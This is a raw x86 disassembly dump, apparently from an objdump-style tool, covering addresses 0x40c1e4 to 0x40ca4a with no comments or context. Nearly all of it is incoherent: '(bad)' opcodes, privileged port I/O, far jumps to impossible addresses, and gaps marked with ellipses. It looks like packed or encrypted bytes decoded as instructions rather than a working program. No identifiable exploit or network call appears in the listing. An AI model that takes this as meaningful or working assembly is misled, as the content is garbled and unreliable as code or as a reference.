  40c1e4:	xchg   DWORD PTR [ebp-0xcbce73],edi
  40c1ea:	jmp    0x2cc392b3
  40c1ef:	cmp    BYTE PTR [edi+edi*8],bh
  40c1f2:	pushaw 
  40c1f4:	mov    ecx,0x560d152
  40c1f9:	out    dx,eax
  40c1fa:	xchg   edi,eax
  40c1fb:	cdq    
  40c1fc:	mov    edx,0x6a304107
  40c201:	inc    DWORD PTR [esi-0x77]
  40c204:	jp     0x40c1f2
  40c206:	ss jns 0x40c23d
  40c209:	(bad)  
  40c20a:	mov    esp,0x87a41d68
	...
  40c21b:	add    BYTE PTR [eax],al
  40c21d:	add    BYTE PTR [ecx+0x34],ch
  40c220:	call   FWORD PTR [eax+edi*2+0x3c]
  40c224:	call   FWORD PTR [esi]
  40c226:	pop    ecx
  40c227:	mov    edx,0x6af20107
  40c22c:	dec    DWORD PTR [esi]
  40c22e:	dec    ecx
  40c22f:	jp     0x40c215
  40c231:	add    BYTE PTR ds:0x77fffeee,al
  40c237:	add    al,ch
  40c239:	mov    BYTE PTR [edi+ebp*8-0x17c80002],ah
  40c240:	idiv   bh
  40c242:	std    
  40c243:	in     eax,dx
  40c244:	je     0x40c24e
  40c246:	mov    dl,0x72
  40c248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c249:	jmp    FWORD PTR [ebp-0x4a234b13]
  40c24f:	in     eax,dx
  40c250:	(bad)  
  40c251:	inc    DWORD PTR [edi-0x1b9317ff]
  40c257:	in     eax,dx
  40c258:	(bad)  
  40c259:	push   DWORD PTR [edi]
  40c25b:	in     eax,0xf6
  40c25d:	(bad)  
  40c25e:	std    
  40c25f:	loopne 0x40c2d6
  40c261:	test   eax,0xb5feedfd
  40c266:	jmp    0xa861:0xe2fffef5
  40c26d:	(bad)  
  40c26e:	fucomp st(5)
  40c270:	mov    ah,0xec
  40c272:	add    eax,0x6ae8feee
  40c277:	mov    al,ds:0xa3edfffe
  40c27c:	out    0xf7,eax
  40c27e:	std    
  40c27f:	in     eax,dx
  40c280:	out    0x55,eax
	...
  40c28e:	add    BYTE PTR [eax],al
  40c290:	add    bl,dl
  40c292:	in     eax,dx
  40c293:	(bad)  
  40c294:	push   edi
  40c296:	int    0xf6
  40c298:	jmp    FWORD PTR [ebp-0x6256b61f]
  40c29e:	in     al,dx
  40c29f:	(bad)  
  40c2a0:	mov    ch,0x8a
  40c2a2:	hlt    
  40c2a3:	(bad)  
  40c2a4:	(bad)  
  40c2a5:	jge    0x40c309
  40c2a7:	or     edi,edi
  40c2a9:	idiv   esi
  40c2ab:	out    0x3d,eax
  40c2ad:	jl     0x40c29b
  40c2af:	(bad)  
  40c2b0:	inc    DWORD PTR [edi+0x7dfff6f9]
  40c2b6:	loope  0x40c2e5
  40c2b8:	test   eax,0xff391b63
  40c2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2be:	adc    al,0x2b
  40c2c0:	push   ecx
  40c2c1:	add    eax,0x76ff390c
  40c2c6:	xor    BYTE PTR [ebx],ch
  40c2c8:	js     0x40c342
  40c2ca:	sbb    al,0x3
  40c2cc:	leave  
  40c2cd:	and    DWORD PTR [ecx+0x3],edx
  40c2d0:	push   ebp
  40c2d1:	fcomp  DWORD PTR [eax-0x7c]
  40c2d4:	(bad)  
  40c2d5:	(bad)  
  40c2d7:	add    ebp,DWORD PTR [edx+0x6c]
  40c2da:	pop    ebx
  40c2db:	scas   al,BYTE PTR es:[edi]
  40c2dc:	pop    es
  40c2dd:	mov    ebx,0xc4ff61dc
  40c2e2:	mov    ch,0xbd
  40c2e4:	sti    
  40c2e5:	dec    ebx
  40c2e6:	mov    eax,ds:0x7b6340f9
  40c2eb:	out    dx,al
  40c2ec:	es jp  0x40c2cc
  40c2ef:	add    edi,edi
  40c2f1:	cs xor al,0x2b
  40c2f4:	test   BYTE PTR [eax],0x0
	...
  40c303:	add    BYTE PTR [esi-0x1997c76d],bl
  40c309:	push   ebp
  40c30a:	ret    0x4ff
  40c30d:	push   ds
  40c30e:	add    eax,DWORD PTR [eax]
  40c310:	jecxz  0x40c29d
  40c312:	scas   al,BYTE PTR es:[edi]
  40c313:	pop    es
  40c314:	mov    ecx,DWORD PTR [eax-0x448b00ca]
  40c31a:	lods   eax,DWORD PTR ds:[esi]
  40c31b:	sti    
  40c31c:	ins    BYTE PTR es:[edi],dx
  40c31d:	cmp    DWORD PTR [ebx],ecx
  40c31f:	call   0xff794534
  40c324:	sub    bl,dh
  40c326:	(bad)  
  40c327:	jmp    FWORD PTR [edi+0x278126a7]
  40c32d:	lock das 
  40c32f:	inc    DWORD PTR [ecx+edi*4-0x43]
  40c333:	sti    
  40c334:	xchg   ebx,eax
  40c335:	rep lods eax,DWORD PTR ds:[esi]
  40c337:	sysenter 
  40c339:	jno    0x40c342
  40c33b:	call   0x443a8a
  40c340:	pop    eax
  40c341:	add    eax,0x81e60829
  40c346:	jmp    0xac8b264e
  40c34b:	cmp    esp,DWORD PTR [ebx+0x5]
  40c34e:	jmp    0xfd08df56
  40c353:	aaa    
  40c354:	fs add eax,0x9bf4ade9
  40c35a:	call   0xe8dcb00c
  40c35f:	xchg   BYTE PTR [esi-0x1976c6c7],bl
  40c365:	cmp    dh,dl
  40c367:	aaa    
	...
  40c374:	add    BYTE PTR [eax],al
  40c376:	add    ah,dl
  40c378:	aam    0xd5
  40c37a:	mov    cl,0xd4
  40c37c:	xor    DWORD PTR [eax+edi*1-0x45],edx
  40c380:	das    
  40c381:	inc    ebx
  40c382:	add    al,0x63
  40c384:	(bad)  
  40c385:	test   al,0xb0
  40c387:	bound  ebx,QWORD PTR [esi]
  40c389:	sbb    al,0x89
  40c38b:	out    0x20,al
  40c38d:	mov    dh,0x37
  40c38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c390:	aam    0x73
  40c392:	adc    DWORD PTR [edi+0x33379e39],0x8c141c32
  40c39c:	mov    bh,0xdc
  40c39e:	sub    eax,DWORD PTR ds:0xea37865e
  40c3a4:	xchg   DWORD PTR [ecx+0x2f],edi
  40c3a7:	je     0x40c3da
  40c3a9:	loop   0x40c3ee
  40c3ab:	mul    esi
  40c3ad:	imul   edi,DWORD PTR [ecx+0x77],0x63376639
  40c3b4:	mov    ecx,0x3154abff
  40c3b9:	inc    esi
  40c3ba:	jbe    0x40c408
  40c3bc:	jnp    0x40c3fb
  40c3be:	das    
  40c3bf:	inc    esp
  40c3c0:	xor    DWORD PTR [esi+0x71],eax
  40c3c3:	xor    edi,DWORD PTR [ecx]
  40c3c5:	ds aaa 
  40c3c7:	xor    al,0xbb
  40c3c9:	jmp    eax
  40c3cb:	js     0x40c40d
  40c3cd:	leave  
  40c3ce:	cs ins BYTE PTR es:[edi],dx
  40c3d0:	xor    BYTE PTR [ebp-0xcfb3e7],dh
  40c3d6:	adc    esp,edi
  40c3d8:	push   0x16ff
	...
  40c3e9:	add    BYTE PTR [edx+ecx*8-0x9],dl
  40c3ed:	add    bl,bh
  40c3ef:	xor    BYTE PTR [ebp+0x5],dh
  40c3f2:	dec    edi
  40c3f3:	mov    cl,0x79
  40c3f5:	jmp    0xe603025a
  40c3fa:	pusha  
  40c3fb:	fimul  DWORD PTR [edx-0x3b61e03]
  40c401:	push   ebx
  40c402:	addr16 fwait
  40c404:	pop    ss
  40c405:	ficom  WORD PTR [ebx]
  40c407:	or     eax,ebp
  40c409:	sub    eax,0x60ff3042
  40c40e:	mov    ds:0xbf7b682c,eax
  40c413:	(bad)  
  40c416:	mov    bl,0xe7
  40c418:	sub    BYTE PTR [eax],ch
  40c41a:	xor    BYTE PTR [di-0x1f],dh
  40c41e:	js     0x40c40a
  40c420:	(bad)  
  40c421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c422:	push   ebp
  40c423:	popf   
  40c424:	mov    cl,0xe0
  40c426:	lahf   
  40c427:	xor    BYTE PTR [edi-0x15],ah
  40c42a:	pusha  
  40c42b:	add    eax,0x8d38e80
  40c430:	call   0xff70fa0f
  40c435:	adc    DWORD PTR [eax],ebp
  40c437:	out    dx,al
  40c438:	inc    eax
  40c439:	jmp    0xc067be73
  40c43e:	lahf   
  40c43f:	xor    dh,bh
  40c441:	fsubr  QWORD PTR [eax+0x1d]
  40c444:	add    BYTE PTR [esi-0x73],bl
  40c447:	xor    BYTE PTR [eax+0x22],ch
  40c44a:	dec    edi
  40c44b:	(bad)  
	...
  40c45a:	add    BYTE PTR [eax],al
  40c45c:	add    BYTE PTR [edx+0x5],ah
  40c45f:	add    BYTE PTR [eax],al
  40c461:	retf   0x74f7
  40c464:	or     BYTE PTR [edx+0x75fffdea],dl
  40c46a:	div    DWORD PTR [esp+edi*8+0x75]
  40c46e:	jne    0x40c477
  40c470:	call   0x3f69ad
  40c475:	push   ebx
  40c476:	mov    BYTE PTR [ebx],0x0
  40c479:	iret   
  40c47a:	jp     0x40c468
  40c47c:	(bad)  
  40c47d:	out    dx,eax
  40c47e:	pop    es
  40c47f:	call   0xff385678
  40c484:	or     ecx,DWORD PTR [edx+0x60]
  40c487:	cmp    BYTE PTR [eax-0xe],ch
  40c48a:	sub    eax,DWORD PTR [eax+0x0]
  40c48d:	retf   0x88db
  40c490:	stos   DWORD PTR es:[edi],eax
  40c491:	(bad)  
  40c494:	push   eax
  40c495:	xor    cl,BYTE PTR [ecx]
  40c497:	add    bh,ch
  40c499:	hlt    
  40c49a:	pusha  
  40c49b:	in     eax,dx
  40c49c:	cmp    DWORD PTR [ebx+0x9],edi
  40c49f:	push   eax
  40c4a0:	(bad)  
  40c4a1:	jg     0x40c4a4
  40c4a3:	call   0xff3acaf8
  40c4a8:	pop    eax
  40c4a9:	and    al,BYTE PTR [eax+eax*1]
  40c4ac:	out    dx,eax
  40c4ad:	xor    al,0x61
  40c4af:	repnz cmp DWORD PTR [ebx+0x9],ecx
  40c4b3:	push   eax
  40c4b4:	jmp    FWORD PTR [edi+0x1]
  40c4b7:	call   0xff3a8af8
  40c4bc:	call   0x3f9723
	...
  40c4cd:	add    BYTE PTR [eax],al
  40c4cf:	add    BYTE PTR [ebx+0x4f0007c2],dh
  40c4d5:	jle    0x40c4c3
  40c4d7:	cmp    DWORD PTR [esi+0x600069ec],0xc
  40c4de:	push   DWORD PTR [ebp+0x52]
  40c4e1:	fisttp DWORD PTR [ecx-0x77074a5c]
  40c4e7:	inc    ebp
  40c4e8:	arpl   ax,bx
  40c4ea:	test   eax,0xb5a4419
  40c4ef:	call   0xff758cca
  40c4f4:	leave  
  40c4f5:	sti    
  40c4f6:	xor    al,0x75
  40c4f8:	pop    ebx
  40c4f9:	les    ecx,FWORD PTR [eax-0x561fdb01]
  40c4ff:	sbb    ebx,DWORD PTR [edx+edx*4]
  40c502:	or     ebp,eax
  40c504:	loop   0x40c515
  40c506:	xor    eax,0x37920cff
  40c50b:	dec    DWORD PTR [esi-0x385bd4dc]
  40c511:	pop    es
  40c512:	xor    eax,0x32921c9
  40c517:	push   ebp
  40c518:	fmul   DWORD PTR [eax]
  40c51a:	add    esp,0xbae1fe7
  40c520:	retf   
  40c521:	mov    ebx,0x33d4ff68
  40c526:	inc    ebx
  40c527:	movntq QWORD PTR [ebx+0x3],mm7
  40c52b:	add    BYTE PTR [ebx-0x5b],ah
  40c52e:	mov    ebp,0x13c9e0fb
	...
  40c543:	das    
  40c544:	push   ds
  40c545:	xor    al,0x75
  40c547:	push   ebx
  40c548:	ja     0x40c4f8
  40c54a:	sti    
  40c54b:	mov    ebx,0x9cff6943
  40c550:	mov    ch,0xbd
  40c552:	sti    
  40c553:	or     ebp,DWORD PTR [ebx]
  40c555:	stc    
  40c556:	inc    eax
  40c557:	arpl   WORD PTR [edi-0x58840452],dx
  40c55d:	push   0xac0c7cff
  40c562:	push   DWORD PTR [edi+edi*2+0x75]
  40c566:	push   eax
  40c567:	ins    BYTE PTR es:[edi],dx
  40c568:	xor    DWORD PTR [ebx],ecx
  40c56a:	call   0xff752a0f
  40c56f:	dec    ebx
  40c570:	add    eax,0x2e545d3d
  40c575:	rol    edx,1
  40c577:	mov    al,ah
  40c579:	call   0x417293b2
  40c57e:	popf   
  40c57f:	or     ch,BYTE PTR [esi]
  40c581:	inc    esi
  40c582:	sar    DWORD PTR [esp+eax*1-0x2b12db17],cl
  40c589:	xor    eax,0x8b1d5cae
  40c58e:	dec    ebx
  40c58f:	sbb    al,0x2e
  40c591:	adc    DWORD PTR [eax-0x43],esi
  40c594:	sub    eax,0xeb45ab1e
  40c599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c59a:	add    eax,DWORD PTR [eax+edi*4]
  40c59d:	or     al,0x2b
  40c59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a0:	pop    ebx
  40c5a1:	push   es
  40c5a2:	xor    al,0x93
  40c5a4:	popf   
  40c5a5:	call   0x40c5ad
	...
  40c5b6:	cld    
  40c5b7:	outs   dx,BYTE PTR ds:[esi]
  40c5b8:	cdq    
  40c5b9:	xor    al,0x6e
  40c5bb:	std    
  40c5bc:	add    BYTE PTR [edx+0x1ce62dab],al
  40c5c2:	icebp  
  40c5c3:	data16 fidiv WORD PTR [ebx]
  40c5c6:	cmp    ecx,ebp
  40c5c8:	adc    al,ch
  40c5ca:	les    ebp,FWORD PTR [esi]
  40c5cc:	push   esp
  40c5cd:	xor    bl,cl
  40c5cf:	call   0xd4f4f966
  40c5d4:	push   eax
  40c5d5:	add    eax,0xd4771e63
  40c5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5db:	mov    bh,0xe0
  40c5dd:	sbb    eax,DWORD PTR [ebx]
  40c5df:	cmp    eax,0xb38b33a6
  40c5e4:	inc    esi
  40c5e5:	xor    ecx,DWORD PTR [ebp+ebp*1-0x6484cfe4]
  40c5ec:	inc    esi
  40c5ed:	xor    edi,DWORD PTR [ebx+edi*1-0x55]
  40c5f1:	add    BYTE PTR [ebx-0x28],ah
  40c5f4:	jno    0x40c616
  40c5f6:	loopne 0x40c640
  40c5f8:	add    BYTE PTR [ebp-0x3b],dh
  40c5fb:	sub    eax,0xb291d369
  40c600:	pop    es
  40c601:	push   ecx
  40c602:	aam    0x68
  40c604:	call   FWORD PTR [esi-0x32]
  40c607:	ret    0xc3fb
  40c60a:	pusha  
  40c60b:	lahf   
  40c60c:	sbb    DWORD PTR [esi-0x6],ecx
  40c60f:	add    al,0xe8
  40c611:	or     esi,DWORD PTR [eax+0x2c]
  40c614:	call   ebx
  40c616:	pusha  
  40c617:	lahf   
  40c618:	and    dh,BYTE PTR [esi]
	...
  40c626:	add    BYTE PTR [eax],al
  40c628:	add    dl,ch
  40c62a:	add    al,0xe8
  40c62c:	xlat   BYTE PTR ds:[ebx]
  40c62d:	push   ecx
  40c62e:	sub    al,0xff
  40c630:	xchg   ebx,eax
  40c631:	pusha  
  40c632:	lahf   
  40c633:	sbb    ebx,DWORD PTR [esi]
  40c635:	retf   0xe804
  40c638:	jecxz  0x40c68b
  40c63a:	sub    al,0xff
  40c63c:	cmp    DWORD PTR [ebx-0x2916bf12],0xe874ff0e
  40c646:	and    al,0xfb
  40c648:	div    DWORD PTR [ecx]
  40c64a:	sub    al,0x68
  40c64c:	je     0x40c61c
  40c64e:	(bad)  
  40c651:	mov    esp,0x68f1752b
  40c656:	sbb    esi,edi
  40c658:	(bad)  
  40c659:	xchg   ecx,eax
  40c65a:	popf   
  40c65b:	je     0x40c670
  40c65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c65e:	sub    al,0x69
  40c660:	in     eax,0x71
  40c662:	mov    dl,0x7
  40c664:	rcl    DWORD PTR [ebx],1
  40c666:	sub    edi,edi
  40c668:	mov    dh,0x71
  40c66a:	mov    dl,0xfb
  40c66c:	scas   al,BYTE PTR es:[edi]
  40c66d:	fild   DWORD PTR [eax+ebp*8]
  40c670:	sbb    edi,esp
  40c672:	sub    edi,edi
  40c674:	mov    al,0x26
  40c676:	add    DWORD PTR [eax],eax
  40c678:	cmp    al,0x4
  40c67a:	sbb    DWORD PTR [ecx-0xcba75b],eax
  40c680:	add    ch,bl
  40c682:	test   DWORD PTR [ebp-0x4],eax
  40c685:	dec    edx
  40c686:	clc    
  40c687:	je     0x40c699
  40c689:	in     eax,dx
  40c68a:	ins    BYTE PTR es:[edi],dx
  40c68b:	or     ebp,eax
	...
  40c699:	add    BYTE PTR [eax],al
  40c69b:	add    BYTE PTR [edx],dl
  40c69d:	pusha  
  40c69e:	(bad)  
  40c69f:	call   DWORD PTR [ecx-0x38]
  40c6a2:	push   cs
  40c6a3:	test   DWORD PTR ds:0x75000001,eax
  40c6a9:	cmp    eax,0x84a00f7
  40c6ae:	add    bh,al
  40c6b0:	pop    es
  40c6b1:	hlt    
  40c6b2:	inc    BYTE PTR [edi]
  40c6b4:	cmp    cl,BYTE PTR [eax]
  40c6b6:	push   0x0
  40c6b8:	and    BYTE PTR [eax],cl
  40c6ba:	push   0x0
  40c6bc:	and    BYTE PTR [eax],cl
  40c6be:	lea    eax,[ebp+0x76]
  40c6c1:	pop    eax
  40c6c2:	mov    WORD PTR [ebp-0x1108a],es
  40c6c8:	retf   0x74f6
  40c6cb:	clc    
  40c6cc:	ins    DWORD PTR es:[edi],dx
  40c6cd:	ins    DWORD PTR es:[edi],dx
  40c6ce:	sti    
  40c6cf:	call   0x4026c4
  40c6d4:	icebp  
  40c6d5:	(bad)  
  40c6d6:	jae    0x40c6dd
  40c6d8:	arpl   WORD PTR [edx],bp
  40c6da:	add    BYTE PTR [eax],al
  40c6dc:	retf   0x978f
  40c6df:	sub    BYTE PTR [ebx-0x358a00ff],cl
  40c6e5:	cvtps2pi mm5,QWORD PTR [ecx-0x74b00a53]
  40c6ec:	cli    
  40c6ed:	stos   DWORD PTR es:[edi],eax
  40c6ee:	test   ah,dh
  40c6f0:	cmc    
  40c6f1:	cmc    
  40c6f2:	(bad)  
  40c6f3:	push   eax
  40c6f4:	dec    eax
  40c6f5:	or     DWORD PTR ds:0x88f5eda9,ebx
  40c6fb:	test   edx,ebx
  40c6fd:	in     eax,dx
  40c6fe:	(bad)  
  40c6ff:	inc    DWORD PTR [eax]
	...
  40c70d:	add    BYTE PTR [eax],al
  40c70f:	bnd jno 0x40c6b6
  40c712:	(bad)  
  40c713:	in     eax,dx
  40c714:	mov    bh,bh
  40c716:	arpl   WORD PTR [bp+si-0x12],bp
  40c71a:	inc    eax
  40c71b:	arpl   WORD PTR [ebx+0x77],di
  40c71e:	lock ins BYTE PTR es:[edi],dx
  40c720:	xor    BYTE PTR [ecx],0xff
  40c723:	neg    BYTE PTR [ecx]
  40c725:	sbb    esi,DWORD PTR [esi-0x45]
  40c728:	mov    dl,0x30
  40c72a:	mov    esi,esp
  40c72c:	test   al,0x38
  40c72e:	call   DWORD PTR [edi+edx*2+0x3]
  40c732:	push   0xffc2e743
  40c737:	inc    ebp
  40c738:	mov    dh,BYTE PTR [edi+esi*8]
  40c73b:	cmp    al,0xbc
  40c73d:	xor    BYTE PTR [ebp+0x67],dh
  40c740:	aam    0xcc
  40c742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c743:	sub    al,0xec
  40c745:	jp     0x40c6cc
  40c747:	cmp    ebp,esp
  40c749:	xor    bh,bh
  40c74b:	loopne 0x40c6e6
  40c74d:	pop    ds
  40c74e:	not    DWORD PTR [esp+eiz*8]
  40c751:	add    esi,DWORD PTR [ebx+edx*2-0x6c]
  40c755:	add    eax,DWORD PTR [eax]
  40c757:	hlt    
  40c758:	rcr    BYTE PTR [ebx+0x35d399b],cl
  40c75e:	jmp    FWORD PTR [esi-0x1300c6f0]
  40c764:	sub    esi,DWORD PTR [esi+0x3b07fb07]
  40c76a:	(bad)  
  40c76b:	fadd   QWORD PTR [edx+eax*1-0x649d3c00]
  40c772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40c77f:	add    BYTE PTR [eax],al
  40c781:	add    BYTE PTR [ecx+0xeff03dd],cl
  40c787:	inc    ecx
  40c788:	cmp    bh,bh
  40c78a:	mov    esp,0xcb07b63b
  40c78f:	(bad)  
  40c790:	cmp    bh,bh
  40c792:	lods   al,BYTE PTR ds:[esi]
  40c793:	lahf   
  40c794:	ins    DWORD PTR es:[edi],dx
  40c795:	call   0x713b46
  40c79a:	pop    ss
  40c79b:	sub    al,0x9b
  40c79d:	call   DWORD PTR [ebp+eax*1-0x77048e6a]
  40c7a4:	jecxz  0x40c768
  40c7a6:	test   BYTE PTR [ebx],ch
  40c7a8:	pop    esp
  40c7a9:	sbb    esi,DWORD PTR [edx+ebp*1-0x72]
  40c7ad:	xor    dh,ch
  40c7af:	cld    
  40c7b0:	nop
  40c7b1:	jne    0x40c74d
  40c7b3:	sub    bh,BYTE PTR [esi-0x65]
  40c7b6:	arpl   WORD PTR ds:0x63cb7186,ax
  40c7bc:	mov    bl,0xc2
  40c7be:	push   esp
  40c7bf:	sub    ebx,DWORD PTR [ebx+ebx*1+0x305e2a54]
  40c7c6:	into   
  40c7c7:	std    
  40c7c8:	inc    eax
  40c7c9:	lea    ebp,[edx]
  40c7cb:	sub    cl,BYTE PTR [esi+0x30]
  40c7ce:	out    dx,al
  40c7cf:	sbb    BYTE PTR [esi],bh
  40c7d1:	xor    BYTE PTR [ebx*1+0x2a246729],ch
  40c7d8:	ss jbe 0x40c7e6
  40c7db:	xor    ch,BYTE PTR [esi]
  40c7dd:	xor    BYTE PTR [ebx],cl
  40c7df:	jo     0x40c82e
  40c7e1:	xor    BYTE PTR [edx+ebp*1],cl
  40c7e4:	push   esp
  40c7e5:	xor    eax,DWORD PTR [eax]
	...
  40c7f3:	add    BYTE PTR [eax],al
  40c7f5:	or     al,0x2a
  40c7f7:	push   ss
  40c7f8:	xor    BYTE PTR [esi-0x7],dh
  40c7fb:	or     eax,0x3d1d5cb6
  40c800:	xor    esp,ebp
  40c802:	sub    esi,edi
  40c804:	jne    0x40c7f9
  40c806:	xor    esi,esi
  40c808:	das    
  40c809:	retf   
  40c80a:	mov    eax,DWORD PTR [ebp+0x30]
  40c80d:	aam    0x29
  40c80f:	sub    al,0x2c
  40c811:	mov    edx,0xc42fdf3c
  40c816:	sub    DWORD PTR [eax+esi*1-0x35],ebx
  40c81a:	and    eax,0x3c630457
  40c81f:	stos   DWORD PTR es:[edi],eax
  40c820:	add    BYTE PTR [ebx-0x30],ah
  40c823:	jno    0x40c845
  40c825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c826:	scas   eax,DWORD PTR es:[edi]
  40c827:	jmp    esp
  40c829:	js     0x40c867
  40c82b:	test   al,0xae
  40c82d:	inc    esp
  40c82e:	(bad)  
  40c82f:	mov    edi,0xafa17e1d
  40c834:	jecxz  0x40c7d5
  40c836:	sub    DWORD PTR [edi-0x7f],ecx
  40c839:	lods   eax,DWORD PTR ds:[esi]
  40c83a:	popa   
  40c83b:	dec    DWORD PTR [esi-0x16984671]
  40c841:	pusha  
  40c842:	sbb    bh,BYTE PTR [esi+0x40eed311]
  40c848:	jmp    0xe1b5f07d
  40c84d:	js     0x40c831
  40c84f:	enter  0x7c66,0xcd
  40c853:	addr16 call 0xc1fee0b9
	...
  40c865:	add    BYTE PTR [eax],al
  40c867:	add    dh,al
  40c869:	jmp    0x40c8ab
  40c86b:	jmp    0xf1b5f080
  40c870:	dec    eax
  40c871:	push   ss
  40c872:	leave  
  40c873:	ds je  0x40c893
  40c876:	cmp    eax,0xc9284c8d
  40c87b:	sub    edx,DWORD PTR [edi]
  40c87d:	sub    DWORD PTR [edx+esi*2+0x43],edx
  40c881:	test   ah,al
  40c883:	sbb    eax,0xe969d02d
  40c888:	fimul  DWORD PTR [ebx]
  40c88a:	call   DWORD PTR [eax+edi*8+0x3c485d20]
  40c891:	sub    BYTE PTR [ecx+0x357c34a4],cl
  40c897:	test   eax,0x61ffc5b8
  40c89c:	rol    ah,cl
  40c89e:	daa    
  40c89f:	sub    BYTE PTR [edi-0x7b],ah
  40c8a2:	aas    
  40c8a3:	jmp    0xe9fc4d6d
  40c8a8:	pusha  
  40c8a9:	add    eax,0xc5ca7868
  40c8ae:	(bad)  
  40c8af:	dec    DWORD PTR [ecx+ecx*1-0x50]
  40c8b3:	jbe    0x40c86f
  40c8b5:	add    al,0xb
  40c8b7:	rcr    BYTE PTR [esi+0x67],0x3f
  40c8bb:	adc    BYTE PTR [edx-0x27bf0fc],0x3
  40c8c2:	add    BYTE PTR [eax],al
  40c8c4:	dec    edx
  40c8c5:	mov    DWORD PTR [eax-0x17feb4c6],edx
  40c8cb:	in     eax,dx
	...
  40c8d8:	add    BYTE PTR [eax],al
  40c8da:	add    BYTE PTR [esi+0x1],cl
  40c8dd:	add    BYTE PTR [edx+0x79],bl
  40c8e0:	(bad)  
  40c8e1:	dec    edi
  40c8e2:	call   0x3f6dfa
  40c8e7:	jp     0x40c93a
  40c8e9:	add    BYTE PTR [bp+si+0x7],cl
  40c8ed:	mov    esi,0x401de668
  40c8f2:	add    BYTE PTR [edx],cl
  40c8f4:	xlat   BYTE PTR ds:[ebx]
  40c8f5:	je     0x40c8ff
  40c8f7:	mov    ds:0xa5ffc87e,al
  40c8fc:	cmp    al,0x67
  40c8fe:	add    DWORD PTR [edx],edi
  40c900:	pop    es
  40c901:	mov    esi,0x401ddc68
  40c906:	add    dl,bh
  40c908:	(bad)  
  40c909:	je     0x40c913
  40c90b:	mov    ds:0x45ffc882,al
  40c910:	or     al,0xb2
  40c912:	mov    ds:0x43ead765,eax
  40c917:	loop   0x40c8c1
  40c919:	cmp    DWORD PTR [ecx+0xa],eax
  40c91c:	dec    edi
  40c91d:	out    0x41,eax
  40c91f:	ins    BYTE PTR es:[edi],dx
  40c920:	add    al,0x0
  40c922:	or     edi,DWORD PTR [edx]
  40c924:	jo     0x40c959
  40c926:	push   esi
  40c927:	bound  esp,QWORD PTR [eax-0x54]
  40c92a:	inc    ebp
  40c92c:	push   edx
  40c92d:	dec    edi
  40c92e:	push   0xbeef03ba
  40c933:	xor    dl,BYTE PTR [ebp+0x1e63413a]
  40c939:	sar    esi,cl
  40c93b:	cs sbb edx,DWORD PTR es:[ebp+0x0]
	...
  40c94c:	add    BYTE PTR [eax],al
  40c94e:	fwait
  40c94f:	ds sub eax,0x31d3b58
  40c955:	out    dx,eax
  40c956:	ffree  st(5)
  40c958:	cmp    ah,BYTE PTR gs:[edx]
  40c95b:	push   ds
  40c95c:	sar    esi,cl
  40c95e:	push   ss
  40c95f:	sbb    eax,DWORD PTR ss:[ecx-0x65]
  40c963:	xchg   BYTE PTR ds:0x2cbb0ee8,ch
  40c969:	dec    DWORD PTR [eax+0x2d7fc51c]
  40c96f:	push   ds
  40c970:	mov    dh,0xf9
  40c972:	sbb    eax,0x1abff0aa
  40c977:	mov    al,0x2c
  40c979:	call   DWORD PTR [ebx+ebp*4+0x5d]
  40c97d:	cmp    BYTE PTR [edi+ebp*1-0x7a],ah
  40c981:	inc    ebp
  40c982:	inc    esp
  40c983:	enter  0x6a2c,0x59
  40c987:	iret   
  40c988:	mov    dh,0x7
  40c98a:	dec    ebx
  40c98b:	fsubr  QWORD PTR ds:0xe0532cff
  40c991:	(bad)  
  40c992:	scas   al,BYTE PTR es:[edi]
  40c993:	xor    al,0x1b
  40c995:	mov    ecx,0x6a2cf01d
  40c99a:	ja     0x40c973
  40c99c:	mov    dh,0x7
  40c99e:	sti    
  40c99f:	iret   
  40c9a0:	sub    eax,0x419504ff
  40c9a5:	cmp    ah,BYTE PTR [edx+0x3c352c1c]
  40c9ab:	inc    ebp
  40c9ac:	ret    0xedff
  40c9af:	test   eax,0xe7fa
	...
  40c9c0:	add    BYTE PTR [edx],dh
  40c9c2:	sub    DWORD PTR [edi+edi*8],ebp
  40c9c5:	dec    ebx
  40c9c6:	fucompp 
  40c9c8:	inc    eax
  40c9c9:	arpl   WORD PTR [ecx+eax*1+0x69056300],ax
  40c9d0:	sub    al,0x4e
  40c9d2:	std    
  40c9d3:	ror    BYTE PTR [esi+edi*4],1
  40c9d6:	es (bad) 
  40c9d8:	sub    al,0x2e
  40c9da:	sub    esi,ecx
  40c9dc:	mov    dh,0x64
  40c9de:	sbb    eax,0x26a4636b
  40c9e3:	push   ds
  40c9e4:	into   
  40c9e5:	stos   DWORD PTR es:[edi],eax
  40c9e6:	inc    ebx
  40c9e7:	in     eax,dx
  40c9e8:	add    ebp,DWORD PTR [esi]
  40c9ea:	jp     0x40c9a9
  40c9ec:	and    BYTE PTR [edi-0x7bd361ab],0x78
  40c9f3:	and    al,0x30
  40c9f5:	adc    esp,DWORD PTR [esi]
  40c9f7:	sbb    al,0x14
  40c9f9:	je     0x40c9ab
  40c9fb:	fcomp  QWORD PTR [ebx]
  40c9fd:	and    eax,0x5803e8b0
  40ca02:	inc    ebp
  40ca03:	out    dx,al
  40ca04:	xchg   BYTE PTR [ecx+0x1c03e903],ah
  40ca0a:	shl    BYTE PTR [eax+0x3],0x63
  40ca0e:	add    eax,0x319e44e9
  40ca13:	pop    esi
  40ca14:	add    al,0x63
  40ca16:	add    eax,0x5c903c3
  40ca1b:	ret    
  40ca1c:	add    edi,DWORD PTR [ecx+0x30c67405]
  40ca22:	aad    0x6b
  40ca24:	xchg   BYTE PTR [eax],al
	...
  40ca32:	add    BYTE PTR [eax],al
  40ca34:	pop    ss
  40ca35:	cs ss sub al,0xb3
  40ca39:	es mov ah,0x2b
  40ca3c:	or     al,0xb0
  40ca3e:	and    al,0x1b
  40ca40:	imul   esi,DWORD PTR [eax+0x456803e8],0xffffff9d
  40ca47:	push   es
  40ca48:	or     al,BYTE PTR [eax]
  40ca4a:	jmp    0x40ca4f
